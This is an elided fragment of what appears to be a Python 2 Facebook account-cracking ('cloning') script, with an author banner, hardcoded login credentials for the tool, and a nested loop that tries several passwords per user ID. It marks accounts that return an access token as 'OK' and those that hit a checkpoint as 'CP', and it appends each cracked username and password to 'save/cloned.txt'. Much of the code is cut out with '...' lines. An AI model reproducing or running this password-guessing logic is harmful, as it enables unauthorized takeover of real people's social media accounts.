...
╔══──────────────────────────
║ AUTHOR  🌐 Haniya009      
║ GITHUB ⚛ https://github.com/Haniya009                                
║ FACEBOOK ♾ https://facebook.com/100077961189798
...
"""
print("""
Author: Commander X from philipines
Facebook: John Ry Adona
Warning :⚠️ INBOX ME FACEBOOK FOR HELP⚠️

""")
CorrectUsername = "Haniya Hanii"
CorrectPassword = "Haniya 786786"
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(FLAME-NAIM-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Hani-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(HANI-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(FLAME-NAIM-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(FLAME-NAIM-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
